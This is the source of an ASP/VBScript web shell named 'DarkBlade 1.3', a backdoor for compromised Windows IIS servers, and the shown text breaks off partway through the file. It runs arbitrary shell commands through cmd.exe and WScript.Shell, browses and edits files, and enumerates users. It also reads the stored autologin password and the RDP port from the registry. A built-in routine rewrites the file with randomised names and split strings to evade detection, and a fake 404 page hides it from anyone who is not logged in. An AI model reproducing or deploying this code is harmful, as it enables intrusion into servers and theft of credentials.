<%@ LANGUAGE='VBScript' CODEPAGE='65001'%>
<%
	Response.Buffer=True
	Response.CharSet="utf-8"
	Server.ScriptTimeOut=300

	'-------------------------------Config-------------------------------
	'Private version, do not share it to anybody!
	'DarkBlade 1.3 by B100d5w0rd, msn:bloodsword@live.cn
	'Final version, no more update
	'Thanks to these hackers:Bin, Luyu, Sht
	
	Const pass="27C839C78A3067DA5175109708C28A"	'tencentisapieceofshit
	Const needEncode=False
	Const encodeNum=20
	Const isDebugMode=False
	Const encodeCut="_"
	Const pamtoEncode="thePath|cmdPath|cmdStr|connStr|queryStr|regPath|pubPam|txtObjInfo|StrTable|mdbPath|searchkey|suUser|suPass|suPath|suCmd|targetUrl|portList|dicList|ipList|destName|loadpath"
	Const showLogin="login"
	Const defaultChr="GB2312"
	Const aspExt="asp|asa|cer|cdx"
	Const textExt="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"
	Const sqlPageSize=50
	Const fToPre="zzzzzzzz.html"
	Const bOtherUser=False		'
	'-------------------------------Config-------------------------------



	'-------------------Transform sign------------------
	Const transformSign="'-------------------Transform sign------------------"
	Const notToTransform="upload|action|file|password|text|server|title|user|login|value|port|filename|name|htmlEnc|type|http|pass|files|path|attributes|goaction|info|download|logout|login|content|charset|font|color|size|value|width|rows|class|name|value|width|size|color|save|down|span|echo|form|byval|find|vbcrlf"
	Const strs_toTransform="command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCounter|PermissionChecker|BrowserType|ContentRotator|SystemRoot|ComSpec|PATHEXT|PROCESSOR|ARCHITECTURE|IDENTIfIER|REVISION|Physical|Memory|Installed|NUMBER_OF_PROCESSORS|PROCESSOR_ARCHITECTURE|Os2LibPath|NameServer|DefaultGateway|HKEY|HKLM|LOCAL_MACHINE|SOFTWARE|CurrentVersion|Winlogon|CurrentControlSet|ControlSet001|WinStations|RDP-Tcp|PROCESSOR_IDENTIfIER|PROCESSOR_LEVEL|PROCESSOR_REVISION|Windows NT|AutoAdminLogon|DefaultUserName|DefaultPassword|ComputerName|DisplayLastUserName|anonymous|LanmanServer|AutoShareServer|EnableSharedNetDrives|EnableSecurityFilters|Engines|SandBoxMode|openrowSet|sp_oacreate|sp_oamethod|sp_oasetproperty|net user|PasswordExpired|Scripting.|.FileSystemObject|Shell.|.Application|WScript.|.Shell|.Stream|Adodb.|.Connection|.RecordSet|MSXML2.|.XMLHTTP|SoftArtisans.|.FileUp|.FileManager|Persits.|MSWC.|xplog70|addextEndedproc|master|cmdShell|regwrite|system32|SetDOMAIN|TZOEnable|43958|Serv-U|SetUSERSetUP|LoginMesFile|RelPaths|DELETEDOMAIN|MAINTENANCE|Maintenance|HomeDirDrive|NeedSecure|HideHidden|AlwaysAllowLogin|ChangePassword|QuotaEnable|SpeedLimitUp|SpeedLimitDown|MaxNrUsers|IdleTimeOut|RWAMELCDP|upadmin|LocalAdministrator|13709620|444553540000|72C24DD5|98424B88AFB8|Server.Execute|Eval|localgroup|MaxUsersLoginPerIP|Server.Execute|ShellExecute|Terminal|Unauthorized|DarkBladePass|AuThenticate|AUTH_USER|WinDir|ExecuteGlobal|sp_addsrvrolemember"
	Const funcs_toTransform="SavetoFile|CopyFile|OpenTextFile|CreateTextFile|DeleteFile|GetParentFolder|GetExtension|CreateFolder|MoveFolder|GetFileName|CopyFolder|MoveFile|DeleteFolder|NameSpace|Environment|ExpandEnvironmentStrings|RegRead|Exec|Run|GetSystemInformation|Save|CopyHere|MoveHere|ReadAll|DriveLetter|DateCreated|LastModIfied|LastAccessed|Filesystem|TotalSize|PasswordMinimumLength|AccountDisabled|IsAccountLocked|AccountExpirationDate|LoadFromFile"
	Dim currentPath,tmpPath,objCountFile,tempFileData,splitArray,strArray_toTransform,str_transformed,varArray_forbidden,funcArray_toTransform,total,arr_notToTransform,var_toTransform_list,strArr_toTransform,funcArr_toTransform,regex,filetopretEnd,nopretEnd,strForbidden
	strForbidden="dim|sub|end|for|and|now|get|Set|chr|int|day|int|rnd|not|len|mid|sun|asc|cos|app|xor|imp|fix|atn|err|rgb|else|const|true|false|call|each|then|next|redim|error|null|empty|until|loop|case|step|log|dir|stop|str"
	Set regex=new RegExp
	regex.Global=True
	regex.IgnoreCase=True
	regex.MultiLine=True
	arr_notToTransform=Split(notToTransform,"|")

	funcArr_toTransform=Split(funcs_toTransform,"|")
	var_toTransform_list=""
	strArr_toTransform=Split(strs_toTransform,"|")
	strUbound=UBound(strArr_toTransform)
	filetopretEnd=request("filetopretEnd")
	nopretEnd=request("nopretEnd")
	serveren=request("serveren")
	Call transinit()
	Sub transinit()
		If filetopretEnd=""And nopretEnd=""Then
			Call userInit()
			response.End
		Else
		Call Transform()
		End If
		Response.Redirect"?goaction=login"
	End Sub
	Sub userInit()
		Dim fsoX,theFolder
		Set fsoX=CreateObj("Scripting.FileSystemObject")
		Set theFolder=fsoX.GetFolder(mapath("."))
		echo"<form method=post>"
		echo"Running first time,choose the file to pretEnd as."
		echo"<select name=""filetopretEnd"">"
		For Each subFile In theFolder.Files
			If(Lcase(Right(subFile.Name,3))="asp"Or Lcase(Right(subFile.Name,3))="asa")And subFile.Name<>getRight(getServerVariable("PATH_INFO"),"/") Then echo"<option value="""&subFile.Name&""">"&subFile.Name&"</option>"
		Next
		echo"</select>"
		echo"<input type=checkbox name=nopretEnd value=1>No pretEnding<br>"
		echo"Server Encode:<input type=text name=serveren value='GB2312'><br>"
		echo"<input type=submit value="" OK "">"
		echo"</form>"
	End Sub
	Sub Transform()
		Dim fsoX,crlf
		crlf=Chr(13)&Chr(10)
		currentPath=mapath(getCurrentFileName(request.ServerVariables("URL")))
		tempFileData=readSelf(currentPath)
		splitArray=Split(tempFileData,transformSign)
		If nopretEnd=""Then nopretEnd=0
		tempFileData=Replace(splitArray(0)&splitArray(3),"encodeNum=20","encodeNum="&getRndNum(20,81))
		If nopretEnd<>1 And filetopretEnd<>""Then tempFileData=Replace(tempFileData,"zzzzzzzz.html",filetopretEnd)
		If serveren<>""Then tempFileData=Replace(tempFileData,"GB2312",serveren)
		tempFileData=Replace(tempFileData,Chr(9),"")
		tempFileData=Replace(tempFileData,crlf&crlf,crlf)
		tempFileData=Replace(tempFileData,crlf&crlf,crlf)
		do_varTransform()
		do_strTransform()
		do_funcTransform()
		saveSelf currentPath,tempFileData
	End Sub

	Function readSelf(thePath)
		Set fsoX=CreateObj("Scripting.FileSystemObject")
		Set objCountFile=fsoX.OpenTextFile(thePath,1,True)
		readSelf=objCountFile.ReadAll
		objCountFile.Close
		Set objCountFile=Nothing
	End Function
	Sub saveSelf(thePath,fileContent)
		Set fsoX=CreateObj("Scripting.FileSystemObject")
		Set objCountFile=fsoX.CreateTextFile(thePath,True)
		objCountFile.Write tempFileData
		objCountFile.Close
		Set objCountFile=Nothing
	End Sub

	Sub do_varTransform
        
		'Sub/Function Transform
		Dim matchColl,arr_varToTransform,matchArr
		regex.Pattern="(sub|function) +[\w]+(?= *\()"
		regex.Global=True
		regex.IgnoreCase=True
		regex.MultiLine=True
		Set matchColl=regex.Execute(tempFileData)
		For Each matched In matchColl
			matched=regRep(matched,"(sub|function) +","",False)
			addToVarArr matched
		Next
		For Each tmpVar_toTramsform In Split(var_toTransform_list,"|")
			do_varReplace tmpVar_toTramsform,0
		Next
		var_toTransform_list=""
		'Var Transform
		regex.Pattern="dim +[\w ,]+"
		Set matchColl=regex.Execute(tempFileData)
		For Each matched In matchColl
			matched=Lcase(matched)
			matched=Trim(Replace(Lcase(matched),"dim ",""))
			For Each varToTransform In Split(matched,",")
				addToVarArr varToTransform
			Next
		Next
		regex.Pattern="const\s+[\w]+(?=\s*=)"
		Set matchColl=regex.execute(tempFileData)
		For Each matched In matchColl
			matched=Replace(Lcase(matched),"const","")
			matched=Trim(Replace(Lcase(matched),"set",""))
			addToVarArr matched
		Next
		'Parameter Transform
		regex.Pattern="(function|sub)\s+[\w]+\([\w,]+"
		Set matchColl=regex.execute(tempFileData)
		For Each matched In matchColl
			matched=getRight(Lcase(matched),"(")
			For Each subPam In Split(matched,",")
				If InStr(subPam," ")>0 Then subPam=getRight(subPam," ")
				addToVarArr Trim(subPam)
			Next
		Next
		regex.Pattern="case\s*""[^\r\n]+"""
		Set matchColl=regex.execute(tempFileData)
		For Each matched In matchColl
			matched=regRep(matched,"case\s*""","",False)
			matched=Replace(matched,"""","")
			If InStr(matched,",")>0 Then
				For Each subMacthed In Split(matched,",")
					addToVarArr Trim(subMacthed)
				Next
			Else
				addToVarArr matched
			End If
		Next
		For Each tmpVar_toTramsform In Split(var_toTransform_list,"|")
			do_varReplace tmpVar_toTramsform,3
		Next
		var_toTransform_list=""

	End Sub
	Sub do_varReplace(varToTransform,intType)
		If varToTransform=""Then Exit Sub
		Dim varTransformed,strPattern
		varTransformed=getRndStr()
		strForbidden=strForbidden&"|"&Lcase(varTransformed)
		varToTransform=Replace(varToTransform,".","\.")
		Select Case intType
			Case 0
				strPattern="([^\w\\])"&varToTransform&"(?![\w\\])"
				tempFileData=regRep(tempFileData,strPattern,"$1"&varTransformed,False)
			Case Else
				strPattern="([^\w\\])"&varToTransform&"(?![\w\\])"
				tempFileData=regRep(tempFileData,strPattern,"$1"&varTransformed,False)
		End Select
	End Sub
	Sub do_strTransform()
		For Each str_toTransform In strArr_toTransform
			do_strReplace str_toTransform
		Next
	End Sub
	Sub do_strReplace(str)
		If str=""Then Exit Sub
		Dim rndNum,str_transformed,strPattern
		rndNum=getRndNum(2,Len(str)-3)
		str_transformed=Left(str,rndNum)&"""&"&getRndStr()&"&"""&Right(str,Len(str)-rndNum)
		strPattern="\b"&Replace(Replace(str,".","\."),"_","\_")&"\b"
		echo strPattern&"<br>"
		tempFileData=regRep(tempFileData,strPattern,str_transformed,False)
	End Sub
	Sub do_funcTransform
		Dim tmpFunc,matchColl,matched
		regex.Global=True
		regex.IgnoreCase=True
		regex.MultiLine=True
		For Each tmpFunc In funcArr_toTransform
			regex.Pattern="[^\n\r]+\."&tmpFunc&"\b[^\n\r]+"
			Set matchColl=regex.Execute(tempFileData)
			For Each matched In matchColl
				do_funcReplace matched,tmpFunc
			Next
		Next
	End Sub
	Sub do_funcReplace(strLine,func_toTransform)
		If func_toTransform=""Or strLine=""Then Exit Sub
		Dim tmpFunc,func_transformed,rndStr,rndNum,line_transformed
		If Left(Lcase(strLine),3)="if "Or Left(Lcase(strLine),4)="for "Then Exit Sub
		rndStr=getRndStr()
		rndNum=getRndNum(1,Len(func_toTransform)-1)
		func_transformed=Left(func_toTransform,rndNum)&"""&"&rndStr&"&"""&Right(func_toTransform,Len(func_toTransform)-rndNum)
		regex.Global=True
		regex.IgnoreCase=True
		regex.MultiLine=True
		regex.Pattern="""[^&]*\b"&func_toTransform&"\b[^&]*"""
		If Left(line_transformed,8)="execute " Or regex.test(strLine)Then
			line_transformed=Replace(strLine,func_toTransform,func_transformed,1,-1,1)
		Else
			line_transformed=Replace(strLine,"""","""""")
			line_transformed=Replace(line_transformed,func_toTransform,func_transformed,1,-1,1)
			line_transformed="execute """&line_transformed&""""
		End If
		tempFileData=Replace(tempFileData,strLine,line_transformed)
	End Sub

	Sub addToVarArr(str)
		If Not isTransAble(str)Then Exit Sub
		If InStr(var_toTransform_list,"|"&str)>0 Or InStr(var_toTransform_list,str&"|")>0 Then Exit Sub
		If var_toTransform_list=""Then
			var_toTransform_list=str
		Else
			var_toTransform_list=var_toTransform_list&"|"&str
		End If
	End Sub
	Function isTransAble(str)
		If Len(str)<4 Then
			isTransAble=False
			Exit Function
		End If
		For Each strNotTransform In arr_notToTransform
			If strNotTransform=Lcase(str)Then
				isTransAble=False
				Exit Function
			End If
		Next
		isTransAble=True
	End Function
	Function getCurrentFileName(url)
		getCurrentFileName=Right(url,Len(url)-InStrrev(url,"/"))
	End Function
	Function getRndStr()
		Dim rndStr
		rndStr=""
		Do While not chkRndStr(rndStr)
			rndStr=""
			For i=1 To getRndNum(3,3)
				rndStr=rndStr&getRndChar()
			Next
		Loop
		getRndStr=rndStr
	End Function
	Function chkRndStr(Str)
		Str=Lcase(str)
		If Left(Str,1)="h"Or Len(str)<3 Then
			chkRndStr=False
			Exit Function
		End If
		If InStr(strForbidden,"|"&Str)>0 Or InStr(strForbidden,Str&"|")>0 Then
			chkRndStr=False
			Exit Function
		End If
		chkRndStr=true
	End Function
	Function getRndChar()
		Dim SYMBOL_Char:SYMBOL_Char="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		Randomize
		getRndChar=Mid(SYMBOL_Char,getRndNum(1,52),1)
	End Function
	Function getRndNum(a,b)
		Randomize
		getRndNum=Int(b * rnd+a)
	End Function

	Function regRep(str,strPattern,replaced,needFormat)
		If needFormat Then
			strPattern=Replace(strPattern,"\","\\")
			strPattern=Replace(strPattern,".","\.")
			strPattern=Replace(strPattern,"?","\?")
			strPattern=Replace(strPattern,"+","\+")
			strPattern=Replace(strPattern,"(","\(")
			strPattern=Replace(strPattern,")","\)")
			strPattern=Replace(strPattern,"*","\*")
			strPattern=Replace(strPattern,"[","\[")
			strPattern=Replace(strPattern,"]","\]")
		End If
		regex.Pattern=strPattern
		regRep=regex.Replace(str,replaced)
	End Function

	'-------------------Transform sign------------------

	Dim goaction,thePath,cmdStr,connStr,regPath,pubPam,serverName,objXml,objWs,objFso,objSa,objStream,objRe,pagePath,pageName,startTime,EndTime,aspPath,rootPath,errMsg,txtObjInfo,trId,SessionKey,SessionValue,cmdPath,formId,subAct,truePath,localName,strFileMethod,fileContent,newOneName,newOneType,dbType,conn,strTable,intPage,mdbName,dbname,packMethod,mdbName2,mdbPath,searchkey,useReg,suUser,suPass,suPort,suPath,suCmd,deldomain,newdomain,newuser,suquit,loginuser,loginpass,mt,targetUrl,ipList,portList,dicList,outPath,outExt,cmdDoTExeFiLe,userPass,queryStr,sversion,cookiePre,cookiePass,strObj,strReplaceTo,needReplace,searchExt,getInc,chkPath,needecho,datem,strRefFile,fsoAttrib,logged,shellenv,nuser,npass,nport,cls_upload,destName,loadPath,strfrm,sqlver,moveme
	sversion="DarkBlade 1.3 Private"
	cookiePre="DarkBlade"
	cookiePass="DarkBladePass"
	doInit()
	logged=isIn()
	If logged Then
		pamInit()
	Else
		goaction=request("goaction")
	End If
	If Not logged And goaction<>showLogin Then show404()
	If bOtherUser And Trim(getServerVariable("AUTH_USER"))="" Then
		Response.Status="401 Unauthorized"
		Response.Addheader"WWW-AuThenticate","BASIC"
		If getServerVariable("AUTH_USER")=""Then Response.End()
	End If
	Select Case goaction
		Case showLogin
			pageLogin()
		Case"objOnSrv"
			PageObjOnSrv()
		Case"userList"
			PageUserList()
		Case"CSInfo"
			PageCSInfo()
		Case"WsCmdRun"
			PageWsCmdRun()
		Case"infoAboutSrv"
			PageInfoAboutSrv()
		Case"MsDataBase"
			PageMsDataBase()
		Case"OtherTools"
			PageOtherTools()
		Case"TxtSearcher"
			PageTxtSearcher()
		Case"ServUp"
			PageServUp()
		Case"ScanShell"
			PageScan()
		Case"Logout"
			PagedoLogout()
		Case"AddToMdb"
			PageAddToMdb()
		Case"SaFileExplorer","FsoFileExplorer"
			PageFileExplorer()
		Case Else
			PageFileExplorer()
	End Select
	doFin

	Sub doInit()
		If Not isDebugMode Then On Error Resume Next
		startTime=Timer()
		Dim formContent,queryContent,upformContent,Sessions,Session_Array,sescontent,strTodecode,pamArrtoEncode
		servurl=getServerVariable("URL")
		Set objXml=CreateObj("MSXML2.XMLHTTP")
		Set objWs=CreateObj("WScript.Shell")
		Set objFso=CreateObj("Scripting.FileSystemObject")
		Set objSa=CreateObj("Shell.Application")
		If Not IsObject(objWs)Then Set objWs=CreateObj("WScript.Shell.1")
		If Not IsObject(objSa)Then Set objSa=CreateObj("Shell.Application.1")
		Set objRe=new RegExp
		objRe.Global=True
		objRe.IgnoreCase=True
		objRe.MultiLine=True
		serverName=getServerVariable("SERVER_NAME")
		pagePath=getServerVariable("PATH_INFO")
		pageName=Lcase(getRight(pagePath,"/"))
		aspPath=mapath(".")
		rootPath=mapath("/")
		formId=1
		trId=1
	End Sub
	Sub pamInit()
		For Each queryContent In request.queryString
			execute queryContent&"=request.queryString("""&queryContent&""")"
		Next
		For Each formContent In request.Form
			execute formContent&"=request.form("""&formContent&""")"
		Next
		If InStr(getServerVariable("CONTENT_TYPE"),"multipart/form-data")=1 Then
			Set cls_upload=new upload_5xsoft
			For Each upformContent In cls_upload.objForm
				execute upformContent&"=cls_upload.objForm("""&upformContent&""")"
			Next
		End If
		pamArrtoEncode=Split(pamtoEncode,"|")
		For Each strTodecode In pamArrtoEncode
			execute""&strTodecode&"=secretDecode("&strTodecode&")"
		Next
		If Right(thePath,1)="\"And Len(thePath)>3 Then thePath=Left(thePath,Len(thePath)-1)
	End Sub
	Sub doFin()
		If Not isDebugMode Then On Error Resume Next
		Dim timeProcessed
		objXml.abort
		Set objXml=Nothing
		Set objWs=Nothing
		Set objFso=Nothing
		Set objSa=Nothing
		Set objRe=Nothing
		EndTime=timer()
		timeProcessed=EndTime-startTime
		echo"<br></div>"
		doTable"100%"
		echo"<tr class=""head"">"
		echo"<td>"
		echoLine errMsg
		timeProcessed=FormatNumber(timeProcessed,5)
		If Left(timeProcessed,1)="."Then timeProcessed="0"&timeProcessed
		echoLine"<br>"
		echo"<div align=right>Processed in :"&timeProcessed&"seconds</div></td></tr></table></body></html>"
		Response.End()
	End Sub

	Sub pageLogin()
		If Not isDebugMode Then On Error Resume Next
		userPass=request("userPass")
		If userPass<>""Then
			userPass=CFSEncode(userPass)
			If CFSEncode(userPass)=pass Then
				Response.Cookies(cookiePass)=userPass
				Response.Redirect(pagePath)
			Else
				errMsgAdd"Fuck you,get out!"
			End If
		End If
		showTitle"Login"
		echo"<center><br>"
		doForm False
		echo"<b>Password : </b>"
		doInput"password","userPass","","30",""
		echo" "
		doSubmit"Get In"
		echo"</center></form>"
	End Sub

	Sub PageInfoAboutSrv()
		If Not isDebugMode Then On Error Resume Next
		Dim i,objWshSysEnv,aryExEnvList,strExEnvList,intCpuNum,strCpuInfo,strOS,terminalPortPath,terminalPortKey,termPort
		strExEnvList="SystemRoot|WinDir|ComSpec|TEMP|TMP|NUMBER_OF_PROCESSORS|OS|Os2LibPath|Path|PATHEXT|PROCESSOR_ARCHITECTURE|"&_
					"PROCESSOR_IDENTIfIER|PROCESSOR_LEVEL|PROCESSOR_REVISION"
		aryExEnvList=Split(strExEnvList,"|")
		Set objWshSysEnv=objWs.Environment("SYSTEM")
		intCpuNum=getServerVariable("NUMBER_OF_PROCESSORS")
		If IsNull(intCpuNum)Or intCpuNum=""Then
			intCpuNum=objWshSysEnv("NUMBER_OF_PROCESSORS")
		End If
		strOS=getServerVariable("OS")
		If IsNull(strOS)Or strOS=""Then
			strOS=objWshSysEnv("OS")
			strOs=strOs&"(probably Windows 2003)"
		End If
		strCpuInfo=objWshSysEnv("PROCESSOR_IDENTIfIER")
		showTitle"Server Infomation"
		doTable"100%"
		doTh
		echo"<td colspan=""2""align=""center"">"
		echo"<b>Server parameters:</b>"
		echo"</td>"
		doTtr
		doTr 0
		doTd"Server name:",""
		doTd serverName,""
		doTtr
		doTr 1
		doTd"Server IP:",""
		doTd getServerVariable("LOCAL_ADDR"),""
		doTtr
		doTr 0
		doTd"Server port:",""
		doTd getServerVariable("SERVER_PORT"),""
		doTtr
		doTr 1
		doTd"Server memory",""
		doTd getTheSize(objSa.GetSystemInformation("PhysicalMemoryInstalled")),""
		doTtr
		doTr 0
		doTd"Server time",""
		doTd Now,""
		doTtr
		doTr 1
		doTd"Server soft",""
		doTd getServerVariable("SERVER_SOFTWARE"),""
		doTtr
		doTr 0
		doTd"Script timeout",""
		doTd Server.ScriptTimeout,""
		doTtr
		doTr 1
		doTd"Number of cpus",""
		doTd intCpuNum,""
		doTtr
		doTr 0
		doTd"Info of cpus",""
		doTd strCpuInfo,""
		doTtr
		doTr 1
		doTd"Server OS",""
		doTd strOS,""
		doTtr
		doTr 0
		doTd"Server script engine",""
		doTd ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion,""
		doTtr
		doTr 1
		doTd"File full path",""
		doTd getServerVariable("PATH_TRANSLATED"),""
		doTtr
		trId=0
		For i=0 To UBound(aryExEnvList)
			doTr trId
			doTd aryExEnvList(i)&":",""
			doTd objWs.ExpandEnvironmentStrings("%"&aryExEnvList(i)&"%"),""
			doTtr
			trIdAdd
		Next
		doTtable
		chkerr(Err)
		echo"<br>"
		Set objWshSysEnv=Nothing
		Dim objTheDrive
		doTable"100%"
		doTh
		echo"<td colspan=""6""align=""center"">"
		echo"<b>Info of disks</b>"
		echo"</td>"
		doTtr
		doTr 0
		doTd"Driver letter",""
		doTd"Type",""
		doTd"Label",""
		doTd"File system",""
		doTd"Space left",""
		doTd"Total space",""
		doTtr
		trId=1
		For Each objTheDrive In objFso.Drives
			Dim dLetter,dType,vName,fSystem,fSpace,tSize
			dLetter=objTheDrive.DriveLetter
			If Lcase(dLetter)<>"a"Then
				dType=getDriveType(objTheDrive.DriveType)
				vName=objTheDrive.VolumeName
				fSystem=objTheDrive.Filesystem
				fSpace=getTheSize(objTheDrive.FreeSpace)
				tSize=getTheSize(objTheDrive.TotalSize)
				doTr trId
				doTd dLetter,""
				doTd dType,""
				doTd vName,""
				doTd fSystem,""
				doTd fSpace,""
				doTd tSize,""
				doTtr
			End If
			dLetter=""
			dType=""
			vName=""
			fSystem=""
			fSpace=""
			tSize=""
			trIdAdd
		Next
		doTtable
		chkerr(Err)
		Set objTheDrive=Nothing
		Dim objTheFolder
		Set objTheFolder=objFso.GetFolder(rootPath)
		echo"<br>"
		doTable"100%"
		doTh
		echo"<td colspan=""2""align=""center"">"
		echo"<b>Info of site:</b>"
		echo"</td>"
		doTtr
		doTr 0
		doTd"Physical path:",""
		doTd rootPath,""
		doTtr
		doTr 1
		doTd"Current size:",""
		doTd getTheSize(objTheFolder.Size),""
		doTtr
		doTr 0
		doTd"File count:",""
		doTd objTheFolder.Files.Count,""
		doTtr
		doTr 1
		doTd"Folder count:",""
		doTd objTheFolder.SubFolders.Count,""
		doTtr
		doTtable
		chkerr(Err)
		echoLine"<br>"
		Dim autoLoginPath,autoLoginUserKey,autoLoginPassKey
		Dim isAutoLoginEnable,autoLoginEnableKey,autoLoginUsername,autoLoginPassword
		terminalPortPath="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
		terminalPortKey="PortNumber"
		termPort=ReadReg(terminalPortPath&terminalPortKey)
		If termPort=""Then termPort="Can't get terminal port.<br/>"
		autoLoginPath="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
		autoLoginEnableKey="AutoAdminLogon"
		autoLoginUserKey="DefaultUserName"
		autoLoginPassKey="DefaultPassword"
		isAutoLoginEnable=ReadReg(autoLoginPath&autoLoginEnableKey)
		If isAutoLoginEnable=0 Then
			autoLoginUsername="Autologin isn't enabled"
		Else
			autoLoginUsername=ReadReg(autoLoginPath&autoLoginUserKey)
		End If
		If isAutoLoginEnable=0 Then
			autoLoginPassword="Autologin isn't enabled"
		Else
			autoLoginPassword=ReadReg(autoLoginPath&autoLoginPassKey)
		End If
		doTable"100%"
		doTh
		echo"<td colspan=""2""align=""center"">"
		echo"<b>Info of Terminal port&Autologin</b>"
		echo"</td>"
		doTtr
		doTr 0
		doTd"Terminal port:",""
		doTd termPort,""
		doTtr
		doTr 1
		doTd"Autologin account:",""
		doTd autoLoginUsername,""
		doTtr
		doTr 0
		doTd"Autologin password:",""
		doTd autoLoginPassword,""
		doTtr
		doTtable
		echo"</ol>"
		chkerr(Err)
	End Sub

	Sub PageObjOnSrv()
		Dim i,objTmp,strObjectList,strDscList

		strObjectList="MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.TOOLS,MSWC.Status,MSWC.Counters,IISSample.ContentRotator,IISSample.PageCounter,MSWC.PermissionChecker,Adodb.Connection,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile,Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.Mailsender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer,IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image,Scripting.FileSystemObject,Adodb.Stream,Shell.Application,Shell.Application.1,WScript.Shell,WScript.Shell.1,WScript.Network,hzhost.modules"
		strDscList="Ad Rotator,Browser info,NextLink,,,Counters,Content rotator,,Permission checker,ADODB connection,SA-FileUp,SoftArtisans FileManager,LyfUpload,ASPUpload,Dimac upload,Dimac JMail,CDONTS SMTP mail,ASPemail,ASPmail,dkQmail,Geocel mail,IISmail,SmtpMail,SoftArtisans ImageGen,Dimac W3Image,FSO,Stream ,,,,,,Hzhost module"

		aryObjectList=Split(strObjectList,",")
		aryDscList=Split(strDscList,",")
		showTitle"Server Object Probe"
		echo"Check for other ObjectId or ClassId.<br>"
		doForm True
		doInput"text","txtObjInfo",txtObjInfo,50,""
		echo" "
		doSubmit"Check"
		doFform
		If txtObjInfo<>""Then
			doUl
			Call getObjInfo(txtObjInfo,"")
			echo"</ul>"
		End If
		echo"<hr/>"
		echo"<ul class=""info""><li><u>Object name</u>Status and more</li>"

		For i=0 To UBound(aryDscList)
			Call getObjInfo(aryObjectList(i),aryDscList(i))
		Next

		echo"</ul><hr/>"
	End Sub

	Sub PageUserList()
		Dim objUser,objGroup,objComputer

		showTitle"Users and Groups Imformation"
		Set objComputer=getObj("WinNT://.")
		objComputer.Filter=Array("User")
		doShowHideMe"User",False
		doTable"100%"
		For Each objUser in objComputer
			doTh
			echo"<td colSpan=""2""align=""center""><b>"&objUser.Name&"</b></td>"
			doTtr
			showUserInfo(objUser.Name)
		Next
		doTtable
		echo"</span><br>"
		chkerr(Err)
		doShowHideMe"UserGroup",False
		objComputer.Filter=Array("Group")
		doTable"100%"
		trId=1
		For Each objGroup in objComputer
			doTr trId
			doTd objGroup.Name,""
			doTd objGroup.Description,""
			doTtr
			trIdAdd
		Next
		doTtable
		echo"</span>"
		chkerr(Err)
	End Sub

	Sub PageCSInfo()
		If Not isDebugMode Then On Error Resume Next
		Dim strKey,strVar,strVariable,SessionContent
		If SessionKey<>""Then Session(SessionKey)=SessionValue
		showTitle"Server-Client Information"
		doShowHideMe"ServerVariables",True
		doTable"100%"
		trId=1
		For Each strVariable In Request.ServerVariables
			doTr trId
			doTdNoWrap strVariable
			doTd getServerVariable(strVariable),""
			doTtr
			trIdAdd
		Next
		doTtable
		echoLine"</span><br>"
		doShowHideMe"Application",True
		doTable"100%"
		trId=1
		For Each strVariable In Application.Contents
			doTr trId
			doTdNoWrap strVariable
			doTd htmlEnc(Application(strVariable)),""
			doTtr
			trIdAdd
		Next
		doTtable
		echoLine"</span><br>"
		doShowHideMe"Session",True
		echo"<br>(ID"&Session.SessionId&")"
		doTable"100%"
		trId=1
		For Each strVariable In Session.Contents
			SessionContent=Session(strVariable)
			doTr trId
			doTdNoWrap strVariable
			doTd htmlEnc(SessionContent),""
			doTtr
			trIdAdd
		Next
		doTr trId
		doForm False
		doTdSubmit"Set Session","20%"
		echo"<td width=""80%""> Key :"
		doInput"text","SessionKey","",30,""
		echo"Value :"
		doInput"text","SessionValue","",30,""

		echo"</td>"
		doFform
		doTtr
		doTtable
		echoLine"</span><br>"
		doShowHideMe"Cookies",True
		doTable"100%"
		trId=1
		For Each strVariable In Request.Cookies
			If Request.Cookies(strVariable).HasKeys Then
				For Each strKey In Request.Cookies(strVariable)
					doTr trId
					doTdNoWrap strVariable&"("&strKey&")"
					doTd htmlEnc(Request.Cookies(strVariable)(strKey)),""
					doTtr
					trIdAdd
				Next
			Else
				doTr trId
				doTdNoWrap strVariable
				doTd htmlEnc(Request.Cookies(strVariable)),""
				doTtr
				trIdAdd
			End If
		Next
		doTtable
		echo"</span>"
		chkerr(Err)
	End Sub

	Sub PageWsCmdRun()
		Dim CmdResult,tmpcmdstr
		If Not isDebugMode Then On Error Resume Next
		showTitle("WScript.Shell Execute")
		If cmdPath<>""Then
			If InStr(Lcase(cmdPath),"cmd.exe")>0 And InStr(cmdStr,"/c ")<1 Then
				tmpcmdstr=cmdPath&" /c "&cmdStr
			Else
				tmpcmdstr=cmdPath&" "&cmdStr
			End If
			If needecho=1 Then
				CmdResult=objWs.Exec(tmpcmdstr).StdOut.ReadAll()
			Else
				objWs.Run tmpcmdstr,0,False
			End If
			chkerr(Err)
		Else
			cmdPath="cmd.exe"
		End If
		doTable"100%"
		doForm True
		doTr 1
		doTd"Path","20%"
		doTdInput"text","cmdPath",cmdPath,"60%","",""
		echo"<td>"
		doChkBox"needecho",1," View result ","checked"
		doSubmit"Run"
		echo"</td>"
		doTtr
		doTr 0
		doTd"Parameters",""
		doTdInput"text","cmdStr",cmdStr,"","","2"
		doTtr
		doFform
		doTtable
		echo"<hr><b>Result:</b><br><span class=""alt1Span"">"&htmlEnc(CmdResult)&"</span>"
		chkerr(Err)
	End Sub

	Sub PageFileExplorer()
		If Not isDebugMode Then On Error Resume Next
		If thePath=""Then thePath=pubPam
		If thePath=""Then thePath=aspPath
		If goaction<>"SaFileExplorer"Then goaction="FsoFileExplorer"
		If subAct="down"Then
			DownTheFile()
			Response.End()
		End If
		If goaction="FsoFileExplorer"Then
			strFileMethod="fso"
			showTitle("FSO File Explorer")
		Else
			strFileMethod="sa"
			showTitle("APP File Explorer")
		End If
		Select Case subAct
			Case"delFile","delFolder"
				delOne()
				thePath=getLeft(thePath,"\",False)
			Case"newone"
				newOne()
			Case"save","utfSave"
				saveFile()
